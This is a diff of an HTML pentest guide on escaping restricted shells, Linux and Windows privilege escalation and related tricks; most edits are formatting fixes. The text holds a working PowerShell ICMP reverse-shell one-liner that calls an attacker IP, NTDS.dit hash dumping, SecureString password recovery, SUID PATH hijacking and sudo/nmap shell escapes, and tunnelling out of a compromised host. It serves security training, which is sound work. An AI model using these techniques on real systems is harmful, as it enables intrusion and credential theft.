 <h3>Restricted Shell<a class="headerlink" href="#restricted-shell" title="Permalink to this headline">¶</a></h3>
-<p>Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from <a class="reference external" href="https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells">Escaping Restricted Linux Shells</a> , <a class="reference external" href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">Escape from SHELLcatraz</a></p>
+<p>Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from <a class="reference external" href="https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells">Escaping Restricted Linux Shells</a>, <a class="reference external" href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">Escape from SHELLcatraz</a></p>
 <div class="section" id="definition">
 <h4>Definition<a class="headerlink" href="#definition" title="Permalink to this headline">¶</a></h4>
 <p>It limits a user’s ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:</p>
 <ul class="simple">
 <li>Using the ‘cd’ command to change directories.</li>
-<li>Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc…).</li>
+<li>Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc…).</li>
 <li>Specifying command names that contain slashes.</li>
 <li>Specifying a filename containing a slash as an argument to the ‘.’ built-in command.</li>
 <li>Specifying a filename containing a slash as an argument to the ‘-p’ option to the ‘hash’ built-in command.</li>
@@ -1380,7 +1440,7 @@ password: &lt;password will be asked&gt;
 </div>
 <div class="section" id="getting-out-of-rvim">
 <h4>Getting out of rvim<a class="headerlink" href="#getting-out-of-rvim" title="Permalink to this headline">¶</a></h4>
-<p>Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techincs and, on top of that, no shell commands at all. Taken from <a class="reference external" href="https://ctftime.org/writeup/5784">vimjail</a></p>
+<p>Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from <a class="reference external" href="https://ctftime.org/writeup/5784">vimjail</a></p>
 <ul class="simple">
 <li>To list all installed features it is possible to use ‘:version’ vim command.</li>
 </ul>
@@ -1497,7 +1557,7 @@ cat ~/.bash_logout
 </div>
 </div>
 <div class="section" id="unprivileged-shell-to-privileged-shell">
-<span id="id13"></span><h2>Unprivileged shell to privileged shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
+<span id="id14"></span><h2>Unprivileged Shell to Privileged Shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
 <p>Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.</p>
 <p>If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.</p>
 <div class="section" id="windows-privilege-escalation">
@@ -1630,7 +1690,7 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 </div>
 <div class="section" id="abusing-token-privileges">
 <h4>Abusing Token Privileges<a class="headerlink" href="#abusing-token-privileges" title="Permalink to this headline">¶</a></h4>
-<p>If we have the windows shell or meterpreter, we can type “whoami /priv” or if we have meterpreter, we can type “getpriv”</p>
+<p>If we have the windows shell or meterpreter, we can type “whoami /priv” or if we have meterpreter, we can type “getprivs”</p>
 <p>If we have any of the below privileges, we can possibly utilize <a class="reference external" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato</a></p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>SeImpersonatePrivilege
 SeAssignPrimaryPrivilege
@@ -1657,7 +1717,7 @@ SeDebugPrivilege
 <li>Are there any binaries with Sticky, suid, guid.</li>
 <li>Are there any world-writable folders, files.</li>
 <li>Are there any world-execuable files.</li>
-<li>Which are the files owned by nobody ( No user )</li>
+<li>Which are the files owned by nobody (No user)</li>
 <li>Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that’s not always the case.)</li>
 <li>What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.</li>
 <li>What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).</li>
@@ -1741,7 +1801,7 @@ find / -group groupname 2&gt; /dev/null
 </div>
 <div class="section" id="execution-of-binary-from-relative-location-than-absolute">
 <h3>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Permalink to this headline">¶</a></h3>
-<p>If we figure out that a suid binary is running with relative locations ( for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>” )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
+<p>If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
 <p>so we can create a file in temp:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;/bin/sh&quot; &gt;&gt; /tmp/id
 chmod +x /tmp/id
@@ -1758,7 +1818,13 @@ root
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
 </pre></div>
 </div>
-<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id” -&gt; Linux searches the filesystem according to its path (here: in /tmp first) -&gt; Our malicious /tmp/scp or /tmp/id gets found and executed as root -&gt; A new bash opens with root privileges.</p>
+<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is:</p>
+<ul class="simple">
+<li>/opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”</li>
+<li>Linux searches the filesystem according to its path (here: in /tmp first)</li>
+<li>Our malicious /tmp/scp or /tmp/id gets found and executed as root</li>
+<li>A new bash opens with root privileges.</li>
+</ul>
 <p>If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it’s something like:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 </pre></div>
@@ -1774,7 +1840,7 @@ ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf
 </div>
 <p>Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>readExampleConf /home/xxxxxxx/example.conf
-&lt;Contents of shadow or id_rsa
+&lt;Contents of shadow or id_rsa&gt;
 </pre></div>
 </div>
 <div class="section" id="directory-symlink">
@@ -1799,7 +1865,7 @@ lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -&gt; /etc/
 </div>
 <div class="section" id="mysql-privileged-escalation">
 <h3>MySQL Privileged Escalation<a class="headerlink" href="#mysql-privileged-escalation" title="Permalink to this headline">¶</a></h3>
-<p>If mysql ( version 4.x, 5.x ) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . A blog named <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
+<p>If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . A blog named <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
 <div class="section" id="more-information">
 <h4>More Information<a class="headerlink" href="#more-information" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
@@ -1831,7 +1897,7 @@ setgid(0); setuid(0);
 system(&quot;/bin/bash -p&quot;); }
 </pre></div>
 </div>
-<p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash,it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
+<p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
 <p>More details can be found at <a class="reference external" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a></p>
 </div>
 <div class="section" id="unattended-apt-upgrade">
@@ -1867,7 +1933,7 @@ Dpkg::Post-Invoke {&quot;command&quot;;};
 </div>
 <div class="section" id="sudo-l-permissions">
 <h3>SUDO -l Permissions<a class="headerlink" href="#sudo-l-permissions" title="Permalink to this headline">¶</a></h3>
-<p>Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find</p>
+<p>Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find and zip.</p>
 <div class="section" id="nmap-suid">
 <h4>nmap suid<a class="headerlink" href="#nmap-suid" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nmap --script &lt;(echo &#39;require &quot;os&quot;.execute &quot;/bin/sh&quot;&#39;)
@@ -2202,20 +2268,279 @@ uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfi
 </div>
 </div>
 <div class="section" id="tips-and-tricks">
-<span id="id16"></span><h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
-<div class="section" id="ftp-services">
-<h3>FTP Services<a class="headerlink" href="#ftp-services" title="Permalink to this headline">¶</a></h3>
+<span id="id17"></span><h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="windows">
+<h3>Windows<a class="headerlink" href="#windows" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="get-childitem-mode-values">
+<h4>Get-ChildItem Mode Values<a class="headerlink" href="#get-childitem-mode-values" title="Permalink to this headline">¶</a></h4>
+<p>‘Mode’ values returned by PowerShell’s Get-ChildItem cmdlet?</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS&gt; gci|select mode,attributes -u
+
+Mode                Attributes
+----                ----------
+d-----               Directory
+d-r---     ReadOnly, Directory
+d----l Directory, ReparsePoint
+-a----                 Archive
+</pre></div>
+</div>
+<p>In any case, the full list is:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>d - Directory
+a - Archive
+r - Read-only
+h - Hidden
+s - System
+l - Reparse point, symlink, etc.
+</pre></div>
+</div>
+</div>
+<div class="section" id="zip-or-unzip-using-only-windows-built-in-capabilities">
+<h4>Zip or unzip using ONLY Windows’ built-in capabilities?<a class="headerlink" href="#zip-or-unzip-using-only-windows-built-in-capabilities" title="Permalink to this headline">¶</a></h4>
+<p>Powershell way</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Add-Type -A System.IO.Compression.FileSystem
+[IO.Compression.ZipFile]::CreateFromDirectory(&#39;foo&#39;, &#39;foo.zip&#39;)
+[IO.Compression.ZipFile]::ExtractToDirectory(&#39;foo.zip&#39;, &#39;bar&#39;)
+</pre></div>
+</div>
+</div>
+<div class="section" id="alternate-data-stream">
+<h4>Alternate Data Stream<a class="headerlink" href="#alternate-data-stream" title="Permalink to this headline">¶</a></h4>
+<p>Sometimes, <a class="reference external" href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">Alternate Data Stream</a> can be used to hide data in streams.</p>
+<p>The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).</p>
+<p>Powershell-Way</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; Get-Item -Path C:\Users\Administrator\example.zip -stream *
+
+Filename: C:\Users\Administrator\example.zip
+
+Stream             Length
+------             -------
+:$DATA             8
+pass.txt           4
+</pre></div>
+</div>
+<p>Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
+The password is Passw0rd!
+</pre></div>
+</div>
+<p>Check a directory for ADS?</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>gci -recurse | % { gi $_.FullName -stream * } | where stream -ne &#39;:$Data&#39;
+</pre></div>
+</div>
+<p>DIR Way</p>
+<p>Current directory ADS Streams</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>dir /r | find &quot;:$DATA&quot;
+</pre></div>
+</div>
+<p>Sub-directories too</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>dir   /s /r | find &quot;:$DATA&quot;
+</pre></div>
+</div>
+<p>Reading the hidden stream</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>more &lt; testfile.txt:hidden_stream::$DATA
+</pre></div>
+</div>
+</div>
+<div class="section" id="redirecting-standard-out-and-standard-error-from-powershell-start-process">
+<h4>Redirecting Standard Out and Standard Error from PowerShell Start-Process<a class="headerlink" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process" title="Permalink to this headline">¶</a></h4>
+<p>Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt
+</pre></div>
+</div>
+<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process">Powershell Start-Process Module Documentation</a>.</p>
+</div>
+<div class="section" id="ntds-dit-and-system-hive">
+<h4>NTDS.dit and SYSTEM hive<a class="headerlink" href="#ntds-dit-and-system-hive" title="Permalink to this headline">¶</a></h4>
+<p>If you have found files such as</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>IP_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
+IP_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
+</pre></div>
+</div>
+<p>Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
+</pre></div>
+</div>
+</div>
+<div class="section" id="icmp-shell">
+<h4>ICMP Shell<a class="headerlink" href="#icmp-shell" title="Permalink to this headline">¶</a></h4>
+<p>Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use <a class="reference external" href="https://github.com/inquisb/icmpsh">Simple reverse ICMP Shell</a> However, this requires the executable to be present on the system. There’s a powershell version of <a class="reference external" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">ICMP Reverse Shell</a> Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>powershell -nop -c &quot;$ip=&#39;your_ip&#39;; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;OK&#39;), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;&#39;), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }&quot;
+</pre></div>
+</div>
+<p>The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won’t be displayed!). Now, there’s a painful way of transferring files to the victim system which is</p>
+<ul class="simple">
+<li>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64)</li>
+<li>Utilize the <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1">Add-Content cmdlet</a> to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>Add-Content &lt;filename&gt; &quot;Base64 encoded content&quot;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Once the base64-encoded data is transferred, we can utilize <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx">certutil</a> from Microsoft to decode the base64-encoded to normal file.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>certutil &lt;-decode/ -encode&gt; &lt;input file&gt; &lt;output file&gt;
+-decode Decode a Base64-encoded file
+-encode Encode a file to Base64
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer management so, we would be able to get full output of the commands.</li>
+<li>Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let’s say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>$username = &#39;UsernameHere&#39;;
+$password = &#39;PasswordHere&#39;;
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Once, we have created a PSCredential, we can use <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command">Invoke-Command</a>  to execute command as that user.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
+-ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn&#39;t work.
+</pre></div>
+</div>
+</li>
+<li><p class="first">Possibly, we can execute the ICMP Shell code to get the shell as the new user.</p>
+</li>
+<li><p class="first">One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user.</p>
+<ul class="simple">
+<li>Check powershell processes with Show-Process</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>Show-Process -Name *power* &quot;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Note down  the PID</li>
+<li>Execute shell as the different user</li>
+<li>Stop-Process the previous PID</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="section" id="recovering-password-from-system-security-securestring">
+<h4>Recovering password from System.Security.SecureString<a class="headerlink" href="#recovering-password-from-system-security-securestring" title="Permalink to this headline">¶</a></h4>
+<p>If we have windows credentials stored as System.Security.SecureString, we can use</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
+$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>$UnsecurePassword = (New-Object PSCredential &quot;user&quot;,$SecurePassword).GetNetworkCredential().Password
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS&gt; $PlainPassword = Read-Host -AsSecureString  &quot;Enter password&quot;
+PS&gt; Enter password: ***
+PS&gt; $PlainPassword
+PS&gt; System.Security.SecureString
+PS&gt; $UnsecurePassword1 = (New-Object PSCredential &quot;user&quot;,$PlainPassword).GetNetworkCredential().Password
+PS&gt; $UnsecurePassword1
+PS&gt; yum
+</pre></div>
+</div>
+</div>
+<div class="section" id="copy-to-or-from-a-powershell-session">
+<h4>Copy To or From a PowerShell Session<a class="headerlink" href="#copy-to-or-from-a-powershell-session" title="Permalink to this headline">¶</a></h4>
+<p>This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from <a class="reference external" href="https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/">Copy To or From a PowerShell Session</a></p>
+<ul class="simple">
+<li>Copy Local files to a remote session :</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>##Initialize the session
+$TargetSession = New-PSSession -ComputerName HALOMEM03
+
+##  Copy Files from Local session to remote session
+Copy-Item -ToSession $TargetSession -Path &quot;C:\Users\Administrator\desktop\scripts\&quot; -Destination &quot;C:\Users\administrator.HALO\desktop\&quot; -Recurse
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Copy some files from a remote session to the local server:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>## Create the session
+$SourceSession = New-PSSession -ComputerName HALODC01
+
+## Copy from Remote machine to Local machine
+Copy-Item -FromSession $SourceSession -Path &quot;C:\Users\Administrator\desktop\scripts\&quot; -Destination &quot;C:\Users\administrator\desktop\&quot; -Recurse
+</pre></div>
+</div>
+</li>
+</ul>
+</div>
+<div class="section" id="get-hash">
+<h4>Get-Hash<a class="headerlink" href="#get-hash" title="Permalink to this headline">¶</a></h4>
+<p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash">Get-FileHash</a> Computes the hash value for a file by using a specified hash algorithm.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; Get-FileHash Hello.rst
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          8A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC       /tmp/Hello.rst
+</pre></div>
+</div>
+</div>
+<div class="section" id="active-directory-enumeration-and-remote-code-execution">
+<h4>Active Directory Enumeration and Remote Code Execution<a class="headerlink" href="#active-directory-enumeration-and-remote-code-execution" title="Permalink to this headline">¶</a></h4>
+<p>Probably, refer  <a class="reference internal" href="LFF-IPS-P3-Exploitation.html"><span class="doc">Infrastructure PenTest Series : Part 3 - Exploitation</span></a></p>
+<p>It contains</p>
+<ul class="simple">
+<li>Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.</li>
+<li>Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.</li>
+</ul>
+</div>
+<div class="section" id="others">
+<h4>Others<a class="headerlink" href="#others" title="Permalink to this headline">¶</a></h4>
+<ul class="simple">
+<li>Invoking Net Use using Credentials to mount remote system</li>
+</ul>
+<blockquote>
+<div><p>The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}
+</pre></div>
+</div>
+</div></blockquote>
+</div>
+</div>
+<div class="section" id="wget">
+<h3>Wget<a class="headerlink" href="#wget" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="ftp-via-wget">
+<h4>FTP via Wget<a class="headerlink" href="#ftp-via-wget" title="Permalink to this headline">¶</a></h4>
 <p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>wget -rq ftp://IP --ftp-user=username --ftp-password=password
 </pre></div>
+</div>
 </div>
 <div class="section" id="wgetrc-commands">
 <h4>wgetrc Commands<a class="headerlink" href="#wgetrc-commands" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-None"><div class="highlight"><pre><span></span>output_document = file -- Set the output filename—the same as ‘-O file’.
 post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
 post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
+-P prefix
+--directory-prefix=prefix
+  Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).
 </pre></div>
 </div>
+</div>
+<div class="section" id="tricks">
+<h4>Tricks<a class="headerlink" href="#tricks" title="Permalink to this headline">¶</a></h4>
+<ul class="simple">
+<li>The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let’s say, your current directory is /home/user/ if we do</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>wget IPAddress -P tmp
+</pre></div>
+</div>
+<p>it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.</p>
+</div></blockquote>
+<ul class="simple">
+<li>wget accepts IP address in decimal format</li>
+</ul>
 </div>
 </div>
 <div class="section" id="ssh">
@@ -2231,6 +2556,47 @@ AllowUsers example_user1 example_user2
 Match user example_user1
 PasswordAuthentication yes
 ## End tighten security
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="ssh-tunneling">
+<h3>SSH Tunneling<a class="headerlink" href="#ssh-tunneling" title="Permalink to this headline">¶</a></h3>
+<p>SSH protocol, which supports bi-directional communication channels can create encrypted tunnels.</p>
+<div class="section" id="local-port-forwarding">
+<h4>Local Port Forwarding<a class="headerlink" href="#local-port-forwarding" title="Permalink to this headline">¶</a></h4>
+<p>SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ssh sshserver -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;
+</pre></div>
+</div>
+<p>Example:</p>
+<p>Imagine we’re on a private network which doesn’t allow connections to a specific server. Let’s say you’re at work and youtube is being blocked. To get around this we can create a tunnel through a server which isn’t on our network and thus can access Youtube.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>$ ssh -L 9000:imgur.com:80 user@example.com
+</pre></div>
+</div>
+<p>The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to http://localhost:9000</p>
+</div>
+<div class="section" id="remote-port-forwarding">
+<h4>Remote Port Forwarding<a class="headerlink" href="#remote-port-forwarding" title="Permalink to this headline">¶</a></h4>
+<p>SSH remote port forwarding allows us to tunnel a remote port to a local server.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ssh sshserver -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;
+</pre></div>
+</div>
+<p>Example:</p>
+<p>Let’s say there’s a wordpress web-application we have compromised and have a www-data shell. Also, let’s say, we are inside a docker environment with the network below</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>172.16.0.1 Host-Machine
+172.16.0.2 WordPress
+172.16.0.3 Joomla
+172.16.0.4 Mysql
+</pre></div>
+</div>
+<p>Now, Let’s say, we have root credentials of mysql and want to access it using dbeaver application. Now, as we have access of wordpress machine, we can basically ssh to our machine (Let’s say our IP is 10.10.15.111), creating a Remote Port Forward</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ssh bitvijays@10.10.15.111 -R 3306:172.16.0.4:3306
+</pre></div>
+</div>
+<p>The above would create a ssh tunnel between 10.10.15.111:3306 and 172.16.0.4:3306. Then, we would be able to just launch dbeaver and connect to localhost mysql and browse the database at 172.16.0.4:3306.</p>
+<p>As we would be probably inside the docker and www-data user, we might not have ssh binary and proper environment variable in that case, we can add below options</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>./ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i id_rsa -R 3306:172.16.0.4:3306 -fN bitvijays@10.10.15.111
 </pre></div>
 </div>
 </div>
@@ -2360,34 +2726,11 @@ This makes all connections considered &quot;insecure&quot; fail unless -k, --ins
